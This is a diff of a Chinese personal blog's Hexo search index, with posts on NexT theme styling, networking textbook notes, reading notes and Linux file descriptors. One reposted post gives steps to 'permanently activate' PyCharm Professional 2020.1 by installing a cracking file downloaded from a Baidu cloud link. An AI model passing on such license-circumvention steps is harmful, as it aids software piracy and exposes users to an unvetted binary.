+<li><p>重启后选择:为Pycharm安装<br><img src="activation_install.jpg" alt="pycharm"></p>
+</li>
+<li><p>点击 是，会自动重启Pycharm<br><img src="activation_agent_success.jpg" alt="pycharm"></p>
+</li>
+<li><p>启动Pycharm后 在菜单Help-&gt;About下看到如下信息证明安装并激活成功！<br><img src="pycharm_about.jpg" alt="pycharm"></p>
+</li>
+</ol>
+<p>本文转载自：<a href="https://www.cnblogs.com/fuhua/p/12799534.html#4565992">https://www.cnblogs.com/fuhua/p/12799534.html#4565992</a></p>
+]]></content>
+      <categories>
+        <category>工具</category>
+        <category>软件</category>
+      </categories>
+      <tags>
+        <tag>软件资源</tag>
       </tags>
   </entry>
   <entry>
@@ -396,74 +464,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hexo-NexT 设置圆角</title>
-    <url>/Hexo-NexT%20%E8%AE%BE%E7%BD%AE%E5%9C%86%E8%A7%92/Hexo-NexT%20%E8%AE%BE%E7%BD%AE%E5%9C%86%E8%A7%92/</url>
-    <content><![CDATA[<ol>
-<li><p>在 blog_root/source/_data/variables.styl 中增加下列代码：</p>
-<span id="more"></span>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">// 圆角设置</span><br><span class="line">$border-radius-inner     = 20px;</span><br><span class="line">$border-radius           = 20px;</span><br></pre></td></tr></table></figure></li>
-<li><p>然后在 NexT 的配置文件 _config.yml 中取消 variables.styl 的注释：</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">variable:</span> <span class="string">source/_data/variables.styl</span></span><br></pre></td></tr></table></figure></li>
-<li><p>问题描述<br>侧边栏的圆角明显有一层阴影，圆角效果不明显<br><img src="circle_problem.png" alt="problem"></p>
-</li>
-<li><p>问题解决<br>github issues 上也有人提过类似的问题<a href="https://github.com/next-theme/hexo-theme-next/issues/51">侧边栏顶栏无法显示为圆角</a>，并且给出了回答。<br><img src="issues_answer.png" alt="issues"><br>回答中有提到黑色背景覆盖了圆角，所以我尝试了下将黑色改为透明，成功实现。具体是修改 /themes/next/source/css/_variables/Gemini.styl 内代码,将 $body-bg-color 赋值为透明 transparent。</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">// Variables of Gemini scheme</span><br><span class="line">// ==================================================</span><br><span class="line"></span><br><span class="line"><span class="keyword">@import</span> <span class="string">&quot;Pisces.styl&quot;</span>;</span><br><span class="line"></span><br><span class="line">// Settings for some of the most global styles.</span><br><span class="line">// --------------------------------------------------</span><br><span class="line">$body-bg-color           = #eee;</span><br><span class="line">// $body-bg-color           = transparent;</span><br><span class="line">// Borders.</span><br><span class="line">// --------------------------------------------------</span><br><span class="line">$box-shadow-inner        = 0 2px 2px 0 rgba(0, 0, 0, .12), 0 3px 1px -2px rgba(0, 0, 0, .06), 0 1px 5px 0 rgba(0, 0, 0, .12);</span><br><span class="line">$box-shadow              = 0 2px 2px 0 rgba(0, 0, 0, .12), 0 3px 1px -2px rgba(0, 0, 0, .06), 0 1px 5px 0 rgba(0, 0, 0, .12), 0 -1px .5px 0 rgba(0, 0, 0, .09);</span><br><span class="line"></span><br><span class="line">// $border-radius-inner     = 20px;</span><br><span class="line">// $border-radius           = 20px;</span><br><span class="line"></span><br><span class="line">$border-radius-inner     = initial;</span><br><span class="line">$border-radius           = initial;</span><br><span class="line">// $border-radius-inner     = 0 0 3px 3px;</span><br><span class="line">// $border-radius           = 3px;</span><br></pre></td></tr></table></figure></li>
-</ol>
-]]></content>
-      <categories>
-        <category>网站建设</category>
-        <category>Hexo 博客</category>
-      </categories>
-      <tags>
-        <tag>Hexo 博客</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ubuntu中Pycharm专业版2020.1 安装，永久激活</title>
-    <url>/Ubuntu%E4%B8%ADPycharm%E4%B8%93%E4%B8%9A%E7%89%882020.1%20%E5%AE%89%E8%A3%85%EF%BC%8C%E6%B0%B8%E4%B9%85%E6%BF%80%E6%B4%BB/Ubuntu%E4%B8%ADPycharm%E4%B8%93%E4%B8%9A%E7%89%882020.1%20%E5%AE%89%E8%A3%85%EF%BC%8C%E6%B0%B8%E4%B9%85%E6%BF%80%E6%B4%BB/</url>
-    <content><![CDATA[<p>记录下 Ubuntu 中 Pycharm 专业版2020.1 安装激活</p>
-<span id="more"></span>
-
-<h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><ol>
-<li><p>从官网下载 Pycharm Linux 专业版</p>
-<p>官网链接：<a href="https://www.jetbrains.com/pycharm/download/#section=linux">https://www.jetbrains.com/pycharm/download/#section=linux</a></p>
-<p>注意只适用于 2020.1 版本</p>
-</li>
-<li><p>解压pycharm-professional-2020.1.tar.gz</p>
-</li>
-<li><p>来到<code>pycharm解压的路径/pycharm-2020.1/bin</code>下，终端运行 pycharm，命令<code>./pycharm.sh</code><br><img src="pycharm_sh.jpg" alt="pycharm"></p>
-</li>
-<li><p>选择Evaluate for free，之后点击Evaluate<br><img src="pycharm_evaluate.jpg" alt="pycharm"></p>
-</li>
-<li><p>在看到如下界面后开始进行永久激活Pycharm<br><img src="welcome_pycharm.jpg" alt="pycharm"></p>
-</li>
-</ol>
-<h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><ol>
-<li><p>下载激活文件</p>
-<blockquote>
-<p><a href="https://pan.baidu.com/s/1_WvpBVTG7OGRoAvBRdlhnw">https://pan.baidu.com/s/1_WvpBVTG7OGRoAvBRdlhnw</a><br>提取码：x1k5</p>
-</blockquote>
-</li>
-<li><p>将激活文件拖到 pycharm 主页面，然后点击 restart<br><img src="activation_restart.jpg" alt="pycharm"></p>
-</li>
-<li><p>重启后选择:为Pycharm安装<br><img src="activation_install.jpg" alt="pycharm"></p>
-</li>
-<li><p>点击 是，会自动重启Pycharm<br><img src="activation_agent_success.jpg" alt="pycharm"></p>
-</li>
-<li><p>启动Pycharm后 在菜单Help-&gt;About下看到如下信息证明安装并激活成功！<br><img src="pycharm_about.jpg" alt="pycharm"></p>
-</li>
-</ol>
-<p>本文转载自：<a href="https://www.cnblogs.com/fuhua/p/12799534.html#4565992">https://www.cnblogs.com/fuhua/p/12799534.html#4565992</a></p>
-]]></content>
-      <categories>
-        <category>工具</category>
-        <category>软件</category>
-      </categories>
-      <tags>
-        <tag>软件资源</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>博客运维记录</title>
     <url>/%E5%8D%9A%E5%AE%A2%E8%BF%90%E7%BB%B4/%E5%8D%9A%E5%AE%A2%E8%BF%90%E7%BB%B4/</url>
     <content><![CDATA[<p>记录使用博客时遇到的问题，以及对博客的优化。</p>
@@ -495,62 +495,6 @@
       </categories>
       <tags>
         <tag>Hexo 博客</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>计算机网路：自顶向下方法</title>
-    <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E8%B7%AF_%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E8%B7%AF_%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<p>《计算机网络：自定向下方法》笔记</p>
-<span id="more"></span>
-
-<h1 id="第1章-计算机网络和因特网"><a href="#第1章-计算机网络和因特网" class="headerlink" title="第1章 计算机网络和因特网"></a>第1章 计算机网络和因特网</h1><h2 id="1-1-什么是因特网"><a href="#1-1-什么是因特网" class="headerlink" title="1.1 什么是因特网"></a>1.1 什么是因特网</h2><blockquote>
-<p>回答这个问题有两种方式：1. 描述因特网的具体构成，即构成因特网的基本硬件和软件组件；2. 根据为分布式应用提供服务的联网基础设施来描述因特网。</p>
-</blockquote>
-<h3 id="1-1-1-具体构成描述"><a href="#1-1-1-具体构成描述" class="headerlink" title="1.1.1 具体构成描述"></a>1.1.1 具体构成描述</h3><blockquote>
-<p>因特网是一个世界范围的计算机网络，即它是一个互联了遍及全世界数十亿计算设备的网络（智能手机、平板电脑、汽车等等）。用因特网术语来说，这些设备都称为<strong>主机（host）</strong>或<strong>端系统（end system）</strong>。</p>
-<p>端系统通过<strong>通信链路（communication link）</strong>和<strong>分组交换机（packet switch）</strong>连接在一起。不同的链路能够以不同的传输速率（transmission rate）传输数据。</p>
-<p>当一个端系统向另一个端系统发送数据时，发送端讲数据分段，并为每段加上首部字节。由此形成的信息包用计算机网络的术语来说称为<strong>分组（packet）</strong>。</p>
-<p>分组交换机从入通信链路接收到达的分组，并将它从出链路转发出去。最著名的两种分组交换机类型是<strong>路由器（router）</strong>和<strong>链路层交换机（link-layer switch）</strong>。链路层交换机通常用于接入网中，而路由器通常用于网络核心中。</p>
-<p>端系统通过因特网服务提供商（Internet Service Provider, ISP）接入因特网。</p>
-</blockquote>
-<h3 id="1-1-2-服务描述"><a href="#1-1-2-服务描述" class="headerlink" title="1.1.2 服务描述"></a>1.1.2 服务描述</h3><blockquote>
-<p>与因特网相连的端系统提供了一个套接字接口（socket interface），该接口规定了运行在一个端系统上的程序请求因特网基础设施向运行在另一个端系统上的特定目的地程序交付数据的方式。（五元组：source_ip, source_port, destination_ip, destination_port, protocol_type ）</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>计算机基础</category>
-        <category>网络</category>
-        <category>计算机网路_自顶向下方法</category>
-      </categories>
-      <tags>
-        <tag>计算机网络</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>读书笔记——《具体生活》</title>
-    <url>/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E2%80%94%E3%80%8A%E5%85%B7%E4%BD%93%E7%94%9F%E6%B4%BB%E3%80%8B/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E2%80%94%E3%80%8A%E5%85%B7%E4%BD%93%E7%94%9F%E6%B4%BB%E3%80%8B/</url>
-    <content><![CDATA[<p>  焦虑是现代人的常态。时间不够用，钱不够花，职业发展不够快，对当下和未来不够了解…我们不断加快生活的节奏，但快节奏之后是否带来了好处，我们并不清楚，只是觉得“快”比“慢”要好。</p>
-<p>  很多时候，我们做不好事情，是我们太匆忙、太着急，其实只要慢三拍，我们的事情会比以前做得好很多。有时候，慢比快好。</p>
-<p>  当忙碌成为生活的主旋律时，我们是否可以思考一下：生活的目的是什么？从容做事，优雅生活，这是我们生活的目的。很多人羡慕所谓的贵族生活，其实过去贵族的物质生活并不比今天的中产阶级好多少，但是他们整体的生活质量远非今天一般意义上的富有家庭所能比的。究其原因，是因为今天的人缺少了那份应有的从容和优雅。</p>
-<p>  当我们做事情的时候能够慢一点，少走点弯路，多花点实践享受浪漫而美好的人生，畅游人类知识和艺术的海洋，我们会发现自己是在真正地生活，而不是只是为了工作而活着。</p>
-<span id="more"></span>
-
-<h2 id="1-旅行的意义"><a href="#1-旅行的意义" class="headerlink" title="1. 旅行的意义"></a>1. 旅行的意义</h2><h2 id="2-博物馆之美"><a href="#2-博物馆之美" class="headerlink" title="2. 博物馆之美"></a>2. 博物馆之美</h2><h2 id="3-读书以以怡情长智"><a href="#3-读书以以怡情长智" class="headerlink" title="3. 读书以以怡情长智"></a>3. 读书以以怡情长智</h2><p>  古人把读万卷书和行万里路看作精英阶层成长不可或缺的两个环节，它们既能使人获得知识，也能令人愉悦自我。</p>
-<h3 id="3-1-阅读的意义"><a href="#3-1-阅读的意义" class="headerlink" title="3.1 阅读的意义"></a>3.1 阅读的意义</h3><ol>
-<li>阅读是放下可以让我们审视人生的不多的方式之一。<br>苏格拉底曾经说过，未经审视的人生不值得度过。而绅士人生需要有闲暇。读书必须有比较长的一段时间，不做其他事情，专心致志地阅读。</li>
-<li>阅读是一种交友方式，借书可以令两人的关系有所增进。<br>借书，说明至少两个人有共同的语言，在此基础上，谈合作也好，谈利益也罢，才搭得上话。对于男女之间交往来说，借一次书，还一次，至少就接触了两次，并且这也能创造一个良好的交谈话题。</li>
-<li>阅读不仅仅是为了让我们在冷酷无情的科技时代获得喘息，让我们重启大脑深入思考的功能，也是抵抗狭隘、思想控制和舆论支配的方式。<blockquote>
-<p>常常在焦虑的时候，或者感到特别难的时候，会去看看曾经觉得深有启发的书，让自己慢慢静下来，焦虑慢慢会平息，困难也会渐渐淡化，恢复状态，继续前行。现在发现，将书中的内容，与自己思想相结合，写出来的时候，特别的舒畅。</p>
-</blockquote>
-</li>
-</ol>
-<h2 id="4-音乐的故事"><a href="#4-音乐的故事" class="headerlink" title="4. 音乐的故事"></a>4. 音乐的故事</h2><h2 id="5-徕卡摄影的魅力"><a href="#5-徕卡摄影的魅力" class="headerlink" title="5. 徕卡摄影的魅力"></a>5. 徕卡摄影的魅力</h2><h2 id="6-香醇美酒"><a href="#6-香醇美酒" class="headerlink" title="6. 香醇美酒"></a>6. 香醇美酒</h2><h2 id="7-奢侈品的光泽"><a href="#7-奢侈品的光泽" class="headerlink" title="7. 奢侈品的光泽"></a>7. 奢侈品的光泽</h2>]]></content>
-      <categories>
-        <category>怡情长智</category>
-        <category>阅读</category>
-      </categories>
-      <tags>
-        <tag>读书/生活</tag>
       </tags>
   </entry>
   <entry>
@@ -648,103 +592,6 @@
       </categories>
       <tags>
         <tag>代理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>彻底弄懂 Linux 下的文件描述符（fd）</title>
-    <url>/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82%20Linux%20%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82%20Linux%20%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89/</url>
-    <content><![CDATA[<p>Linux 下的文件描述符</p>
-<span id="more"></span>
-
-<h2 id="1-从一个最常见的例子说起"><a href="#1-从一个最常见的例子说起" class="headerlink" title="1. 从一个最常见的例子说起"></a>1. 从一个最常见的例子说起</h2><p>在使用Linux的过程中， 我们平时经常看到下面这样的用法：</p>
-<blockquote>
-<p>echo log &gt; /dev/null 2&gt;&amp;1</p>
-</blockquote>
-<ul>
-<li><blockquote>
-<p>  ：表示将输出结果重定向到哪里，例如：echo “123” &gt; /home/123.txt</p>
-</blockquote>
-</li>
-<li>/dev/null ：表示空设备文件<br>所以 echo log &gt; /dev/null 表示把日志输出到空文件设备，也就是将打印信息丢弃掉，屏幕上什么也不显示。</li>
-<li>1  ：表示stdout标准输出</li>
-<li>2  ：表示stderr标准错误</li>
-<li>&amp;  ：表示等同于的意思</li>
-</ul>
-<p>所以  2&gt;&amp;1 表示2的输出重定向等同于1，也就是标准错误输出重定向到标准输出。因为前面标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p>
-<p>这个用法平时很常见，重点是为什么这里是用 2 和 1 ，不是3456什么的呢？这要从 Linux 中的文件描述符说起。</p>
-<h2 id="2-Linux中的文件描述符（file-descriptor）"><a href="#2-Linux中的文件描述符（file-descriptor）" class="headerlink" title="2. Linux中的文件描述符（file descriptor）"></a>2. Linux中的文件描述符（file descriptor）</h2><p>我们知道在Linux系统中一切皆可以看成是文件，文件又可分为：普通文件、目录文件、链接文件和设备文件。在操作这些所谓的文件的时候，我们每操作一次就找一次名字，这会耗费大量的时间和效率。所以Linux中规定每一个文件对应一个索引，这样要操作文件的时候，我们直接找到索引就可以对其进行操作了。</p>
-<p>文件描述符（file descriptor）就是内核为了高效管理这些已经被打开的文件所创建的索引，其是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I/O操作的系统调用都通过文件描述符来实现。同时还规定系统刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。这意味着如果此时去打开一个新的文件，它的文件描述符会是3，再打开一个文件文件描述符就是4……</p>
-<p>Linux内核对所有打开的文件有一个文件描述符表格，里面存储了每个文件描述符作为索引与一个打开文件相对应的关系，简单理解就是下图这样一个数组，文件描述符（索引）就是文件描述符表这个数组的下标，数组的内容就是指向一个个打开的文件的指针。</p>
-<p><img src="file_descriptor.png" alt="file descriptor"></p>
-<p><strong>上面只是简单理解，实际上关于文件描述符，Linux内核维护了3个数据结构：</strong></p>
-<ul>
-<li>进程级的文件描述符表</li>
-<li>系统级的打开文件描述符表</li>
-<li>文件系统的i-node表</li>
-</ul>
-<p>一个 Linux 进程启动后，会在内核空间中创建一个 PCB(Process Control Block) 控制块，PCB 内部有一个文件描述符表（File descriptor table），记录着当前进程所有可用的文件描述符，也即当前进程所有打开的文件。进程级的描述符表的每一条记录了单个进程所使用的文件描述符的相关信息，进程之间相互独立，一个进程使用了文件描述符3，另一个进程也可以用3。除了进程级的文件描述符表，系统还需要维护另外两张表：打开文件表、i-node 表。这两张表存储了每个打开文件的打开文件句柄（open file handle）。一个打开文件句柄存储了与一个打开文件相关的全部信息。</p>
-<p><strong>系统级的打开文件描述符表：</strong></p>
-<ul>
-<li>当前文件偏移量（调用read()和write()时更新，或使用lseek()直接修改）</li>
-<li>打开文件时的标识（open()的flags参数）</li>
-<li>文件访问模式（如调用open()时所设置的只读模式、只写模式或读写模式）</li>
-<li>与信号驱动相关的设置</li>
-<li>对该文件i-node对象的引用，即i-node 表指针</li>
-</ul>
-<p><strong>文件系统的i-node表：</strong></p>
-<ul>
-<li><p>文件类型（例如：常规文件、套接字或FIFO）和访问权限</p>
-</li>
-<li><p>一个指针，指向该文件所持有的锁列表</p>
-</li>
-<li><p>文件的各种属性，包括文件大小以及与不同类型操作相关的时间戳</p>
-</li>
-<li><p>文件描述符、打开的文件句柄以及i-node之间的关系如下图：<br><img src="relationship.png" alt="relationship"></p>
-</li>
-<li><p>在进程 A 中，文件描述符 1 和 20 都指向了同一个打开文件表项，标号为 23（指向了打开文件表中下标为 23 的数组元素），这可能是通过调用 dup()、dup2()、fcntl() 或者对同一个文件多次调用了 open() 函数形成的。</p>
-</li>
-<li><p>进程 A 的文件描述符 2 和进程 B 的文件描述符 2 都指向了同一个文件，这可能是在调用 fork() 后出现的（即进程 A、B 是父子进程关系），或者是不同的进程独自去调用 open() 函数打开了同一个文件，此时进程内部的描述符正好分配到与其他进程打开该文件的描述符一样。</p>
-</li>
-<li><p>进程 A 的描述符 0 和进程 B 的描述符 3 分别指向不同的打开文件表项，但这些表项均指向 i-node 表的同一个条目（标号为 1976）；换言之，它们指向了同一个文件。发生这种情况是因为每个进程各自对同一个文件发起了 open() 调用。同一个进程两次打开同一个文件，也会发生类似情况。 </p>
-</li>
-</ul>
-<p><strong>这就说明：同一个进程的不同文件描述符可以指向同一个文件；不同进程可以拥有相同的文件描述符；不同进程的同一个文件描述符可以指向不同的文件（一般也是这样，除了 0、1、2 这三个特殊的文件）；不同进程的不同文件描述符也可以指向同一个文件。</strong></p>
-<h2 id="3-Linux上打开文件举例"><a href="#3-Linux上打开文件举例" class="headerlink" title="3. Linux上打开文件举例"></a>3. Linux上打开文件举例</h2><p>比如在Linux上用 vim test.py 打开一个文件，保持打开状态，再新打开一个新的shell，输入命令pidof vim 获取vim进程的pid号，然后 ll  /proc/$pid/fd 查看vim 进程所使用的文件描述符列表。<br><img src="example_vim.png" alt="example vim"></p>
-<p>/dev/pts是远程登陆(telnet,ssh等)后创建的控制台设备文件所在的目录。因为我是通过Xshell远程登录的，所以标准输入0，标准输出1，标准错误2的文件描述符都指向虚拟终端控制台 /dev/pts/6 。再看下面是新打开的 test.py 的文件描述符，竟然是4，说好的从3开始呢？</p>
-<p>这个我也困扰了好久，查了各种资料，终于在一个大佬的帮助下在一个论坛找到原因，有时候中文查不到还是要试试英文搜索啊。因为vim这种编辑器的原理是先打开源文件并拷贝，然后关闭源文件再打开自己的副本，修改完文件保存的时候直接将副本重命名覆盖源文件。所以打开源文件的时候用的文件描述符3，然后打开自己的副本是时候就该用文件描述符4了，然后关闭源文件，文件描述符3就被释放了，我们查看的时候就只剩下了4，这里它指向的是vim创建的副本文件。这里只是说个大概意思，具体深究要去深入了解一下<a href="https://blog.csdn.net/weixin_43535689/article/details/104750148">vim的实现原理——奥尔特星云大使</a>，下面是当时我看到的论坛上的资料截图，链接在这：<a href="https://stackoverflow.com/questions/48588284/lsof-command-can-not-return-files-being-opened-by-kwrite">StackOverFlow</a>。<br><img src="stackoverflow_vim.png" alt="stackoverflow vim"></p>
-<h2 id="4-C语言中文件描述符的使用"><a href="#4-C语言中文件描述符的使用" class="headerlink" title="4. C语言中文件描述符的使用"></a>4. C语言中文件描述符的使用</h2><p>C语言中可以通过 open 函数返回一个文件的文件描述符，首先创建一个 test.py 文件用于打开，然后创建一个 test.c 文件，输入下面代码保存。 编译后执行，发现新打开文件的文件描述符是3。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">&quot;test.py&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;test.py fd = %d \n&quot;</span>, fd);  <span class="comment">// test.py fd = 3</span></span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="5-Python中文件描述符的使用"><a href="#5-Python中文件描述符的使用" class="headerlink" title="5. Python中文件描述符的使用"></a>5. Python中文件描述符的使用</h2><p>Python中通过 sys 模块封装了标准输入、标准输出和错误输出。通过我们平时常用的内建函数 open 可以获取一个文件的文件描述符，首先创建一个 test.py 文件用于打开，然后创建一个 test2.py 文件，输入下面代码保存。 执行，发现新打开文件的文件描述符是3。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stdin fd = &#x27;</span>, sys.stdin.fileno())  // stdin fd = <span class="number">0</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stdout fd = &#x27;</span>, sys.stdout.fileno())  // stdout fd = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stderr fd = &#x27;</span>, sys.stderr.fileno())  // stderr fd = <span class="number">2</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.py&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;test.py fd = &#x27;</span>, f.fileno())  // test.py fd = <span class="number">3</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="6-Linux配置系统最大打开文件描述符个数"><a href="#6-Linux配置系统最大打开文件描述符个数" class="headerlink" title="6. Linux配置系统最大打开文件描述符个数"></a>6. Linux配置系统最大打开文件描述符个数</h2><h3 id="系统级限制"><a href="#系统级限制" class="headerlink" title="系统级限制"></a>系统级限制</h3><p>理论上系统内存有多少就可以打开多少的文件描述符，但是在实际中内核是会做相应的处理，一般最大打开文件数会是系统内存的10%（以KB来计算），称之为系统级限制。这个数字可以通过 cat /proc/sys/fs/file-max 或者 sysctl -a | grep fs.file-max 命令查看。</p>
-<p>更改系统级限制有临时更改和永久更改两种方式：</p>
-<ul>
-<li>临时更改：session断开或者系统重启后会恢复原来的设置值。使用命令 sysctl -w fs.file-max=xxxx，其中xxxx就是要设置的数字。</li>
-<li>永久更改：vim编辑 /etc/sysctl.conf 文件，在后面添加 fs.file-max=xxxx，其中xxxx就是要设置的数字。保存退出后还要使用sysctl -p 命令使其生效。</li>
-</ul>
-<h3 id="用户级限制"><a href="#用户级限制" class="headerlink" title="用户级限制"></a>用户级限制</h3><p>同时为了控制每个进程消耗的文件资源，内核也会对单个进程最大打开文件数做默认限制，即用户级限制。32位系统默认值一般是1024，64位系统默认值一般是65535，可以使用 ulimit -n 命令查看。</p>
-<p>更改用户级限制也有临时更改和永久更改两种方式：</p>
-<ul>
-<li>临时更改：session断开或者系统重启后会恢复原来的设置值。使用命令 ulimit -SHn xxxx 命令来修改，其中xxxx就是要设置的数字。</li>
-<li>永久更改：vim编辑 /etc/security/limits.conf 文件，修改其中的 hard nofile xxxx 和 soft nofile xxxx，其中xxxx就是要设置的数字。保存后退出。关于hard和soft的区别，参照下面参考链接中的第5个。</li>
-</ul>
-<h2 id="7-参考链接"><a href="#7-参考链接" class="headerlink" title="7. 参考链接"></a>7. 参考链接</h2><ol>
-<li><a href="https://blog.csdn.net/cywosp/article/details/38965239">每天进步一点点——Linux中的文件描述符与打开文件之间的关系——cywosp</a></li>
-<li><a href="http://c.biancheng.net/view/3066.html">Linux文件描述符到底是什么？——C语言中文网</a></li>
-<li><a href="https://www.jianshu.com/p/0ff9ff1d108e">句柄和文件描述符（FD）——阳光丶不锈</a></li>
-<li><a href="https://juejin.cn/post/6844903962043236365#heading-0">带你破案：文件描述符到底是什么？——vran</a></li>
-<li><a href="http://www.ideabuffer.cn/2016/11/20/Linux%E9%85%8D%E7%BD%AE%E8%B0%83%E4%BC%98%EF%BC%9A%E6%9C%80%E5%A4%A7%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%AA%E6%95%B0/">Linux配置调优：最大打开文件描述符个数——Idea Buffer</a></li>
-<li><a href="%E4%BF%AE%E6%94%B9Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E7%9A%84%E6%9C%80%E5%A4%A7%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E9%99%90%E5%88%B6">修改Linux系统下的最大文件描述符限制——BlueguyChui</a></li>
-</ol>
-<p>————————————————<br>版权声明：本文为CSDN博主「杰克小麻雀」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/yushuaigee/article/details/107883964">https://blog.csdn.net/yushuaigee/article/details/107883964</a></p>
-]]></content>
-      <categories>
-        <category>linux</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
       </tags>
   </entry>
   <entry>
@@ -905,6 +752,132 @@
       </tags>
   </entry>
   <entry>
+    <title>计算机网路：自顶向下方法</title>
+    <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E8%B7%AF_%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E8%B7%AF_%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<p>《计算机网络：自定向下方法》笔记</p>
+<span id="more"></span>
+
+<h1 id="第1章-计算机网络和因特网"><a href="#第1章-计算机网络和因特网" class="headerlink" title="第1章 计算机网络和因特网"></a>第1章 计算机网络和因特网</h1><h2 id="1-1-什么是因特网"><a href="#1-1-什么是因特网" class="headerlink" title="1.1 什么是因特网"></a>1.1 什么是因特网</h2><blockquote>
+<p>回答这个问题有两种方式：1. 描述因特网的具体构成，即构成因特网的基本硬件和软件组件；2. 根据为分布式应用提供服务的联网基础设施来描述因特网。</p>
+</blockquote>
+<h3 id="1-1-1-具体构成描述"><a href="#1-1-1-具体构成描述" class="headerlink" title="1.1.1 具体构成描述"></a>1.1.1 具体构成描述</h3><blockquote>
+<p>因特网是一个世界范围的计算机网络，即它是一个互联了遍及全世界数十亿计算设备的网络（智能手机、平板电脑、汽车等等）。用因特网术语来说，这些设备都称为<strong>主机（host）</strong>或<strong>端系统（end system）</strong>。</p>
+<p>端系统通过<strong>通信链路（communication link）</strong>和<strong>分组交换机（packet switch）</strong>连接在一起。不同的链路能够以不同的传输速率（transmission rate）传输数据。</p>
+<p>当一个端系统向另一个端系统发送数据时，发送端讲数据分段，并为每段加上首部字节。由此形成的信息包用计算机网络的术语来说称为<strong>分组（packet）</strong>。</p>
+<p>分组交换机从入通信链路接收到达的分组，并将它从出链路转发出去。最著名的两种分组交换机类型是<strong>路由器（router）</strong>和<strong>链路层交换机（link-layer switch）</strong>。链路层交换机通常用于接入网中，而路由器通常用于网络核心中。</p>
+<p>端系统通过因特网服务提供商（Internet Service Provider, ISP）接入因特网。</p>
+</blockquote>
+<h3 id="1-1-2-服务描述"><a href="#1-1-2-服务描述" class="headerlink" title="1.1.2 服务描述"></a>1.1.2 服务描述</h3><blockquote>
+<p>与因特网相连的端系统提供了一个套接字接口（socket interface），该接口规定了运行在一个端系统上的程序请求因特网基础设施向运行在另一个端系统上的特定目的地程序交付数据的方式。（五元组：source_ip, source_port, destination_ip, destination_port, protocol_type ）</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>计算机基础</category>
+        <category>网络</category>
+        <category>计算机网路_自顶向下方法</category>
+      </categories>
+      <tags>
+        <tag>计算机网络</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>彻底弄懂 Linux 下的文件描述符（fd）</title>
